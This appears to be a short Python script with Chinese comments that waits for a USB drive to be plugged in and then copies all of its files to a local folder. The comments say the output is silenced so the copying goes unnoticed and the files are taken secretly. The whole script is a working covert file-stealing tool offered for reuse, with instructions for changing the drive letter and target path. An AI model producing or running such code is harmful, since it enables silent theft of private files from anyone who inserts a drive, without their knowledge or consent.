from time import sleep
import os, shutil
usb_path="H://"  ##我的电脑插入U盘后为H盘，这里需要各位自己改正
x=True

###一直检测,指导检测到U盘插入
while x:
    try:
        content=os.listdir(usb_path)    ##获取U盘所有文件夹
    except:
        sleep(3)
       # print('No such file,trying...')  ##为了神不知鬼不觉,将所有print语句注释掉了,如果你不太熟悉该程序逻辑，可将print语句取消注释
        pass
    else:
        x=False
#print(content)
shutil.copytree(usb_path, r'E:\python\new') ###将U盘文件偷偷地考到文件夹E:\python\new中,可自己改为其他文件夹
